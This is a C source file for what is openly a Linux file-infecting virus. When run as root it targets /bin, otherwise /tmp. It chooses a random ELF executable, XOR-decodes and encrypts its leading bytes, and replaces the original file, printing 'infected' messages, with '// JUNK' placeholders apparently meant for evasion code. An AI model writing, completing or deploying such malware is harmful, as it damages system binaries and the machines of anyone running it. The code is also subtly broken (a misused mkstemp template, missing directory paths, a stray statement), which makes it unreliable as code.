#include "includes.h"
#include "infection.h"


// Entry point
void infectRandomExecutable(const char* directoryPath) {
        struct stat st;

      //   JUNK

    char* targetDirectory;
    if (getuid() == 0) {
        targetDirectory = "/bin";
    } else {
        targetDirectory = "/tmp";
    }

    DIR* dir = opendir(targetDirectory);
    if (dir == NULL) {
        ("opendir");
        return;
    }

    struct dirent* entry;
    int numExecutables = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char* fileName = entry->d_name;
            if (isELF(fileName) && isClean(fileName)) {
                numExecutables++;
            }
        }
    }
    closedir(dir);

    if (numExecutables == 0) {
        printf("No executables found in %s\n", targetDirectory);
        return;
    }

          //   JUNK

    srand(time(NULL));
    int targetIndex = rand() % numExecutables + 1;

    dir = opendir(targetDirectory);
    int currentIdx = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char* fileName = entry->d_name;
            if (isELF(fileName) && isClean(fileName)) {
                currentIdx++;
                if (currentIdx == targetIndex) {
                    char fullPath[PATH_MAX];
                    snprintf(fullPath, sizeof(fullPath), "%s/%s", targetDirectory, fileName);

                    int vfd = open(fullPath, O_RDONLY);
                    infectHostFile(fullPath, vfd);
                    close(vfd);
                    printf("Successfully infected: %s\n", fullPath);
                    break;
                }
            }
        }
    }
    closedir(dir);
}

void infectDifferentDirectories(char* argv[]) {
    if (getuid() == 0) {
        infectRandomExecutable("/bin");
    } else {
        infectRandomExecutable("/tmp");
    }
}

int isELF(char* fileName) {

      //   JUNK

   if (fileName[0] == '.') return 0;

    int hfd = open(fileName, O_RDONLY);
    if (hfd < 0) {
        return 0;
    }

    Elf32_Ehdr elf_header;
    ssize_t bytesRead = read(hfd, &elf_header, sizeof(Elf32_Ehdr));
    close(hfd);

    if (bytesRead < sizeof(Elf32_Ehdr)) return 0;

    return (elf_header.e_ident[EI_MAG0] == ELFMAG0 &&
            elf_header.e_ident[EI_MAG1] == ELFMAG1 &&
            elf_header.e_ident[EI_MAG2] == ELFMAG2 &&
            elf_header.e_ident[EI_MAG3] == ELFMAG3);
}


int isClean(char* fileName) {

      //   JUNK
      
    int fd = open(fileName, O_RDONLY);
    if (fd < 0) return 0;

    unsigned char xorcode[CODESIZE];
    ssize_t bytesRead = read(fd, xorcode, CODESIZE);
    close(fd);

    if (bytesRead < CODESIZE) return 0;

    b_xor(xorcode, CODESIZE);

    for (int i = 0; i < bytesRead; i++) {
        if (xorcode[i] == 0xFF || xorcode[i] == 0x00) {
            return 0;
        }
    }

    return 1;
}

void infectHostFile(char* hostFileName, int vfd) {
    struct stat st;
    if (fstat(vfd, &st) < 0) {
        return;
    }

    char* tempFileName = "/tmp/";
    int tfd = mkstemp(tempFileName);
    if (tfd < 0) {
        return;
    }

    unsigned char xorcode[CODESIZE];
    ssize_t bytesRead = read(vfd, xorcode, CODESIZE);
    if (bytesRead < CODESIZE) {
        printf("Not enough bytes read from file: %s\n", hostFileName);
        close(tfd);
        unlink(tempFileName);
        return;
    }

    b_xor(xorcode, CODESIZE);

    // Add a random delay before encryption
    srand(time(NULL));
    int delay = rand() % 1000; 
    usleep(delay * 1000); 

    encrypt_code(xorcode, CODESIZE, generateRandomKey(32), 32);

    if (write(tfd, xorcode, CODESIZE) < 0) {
        close(tfd);
        unlink(tempFileName);
        return;
    }

    if (lseek(vfd, 0, SEEK_SET) < 0) {
        close(tfd);
        unlink(tempFileName);
        return;
    }

    ssize_t bytesWritten = sendfile(vfd, tfd, NULL, CODESIZE);
    if (bytesWritten < 0) {
        close(tfd);
        unlink(tempFileName);
        return;
    }

    close(tfd);
    unlink(hostFileName);

    if (rename(tempFileName, hostFileName) < 0) {
        unlink(tempFileName);
        return;
    }

    chmod(hostFileName, st.st_mode);
    printf("Infected host file: %s\n", hostFileName);
}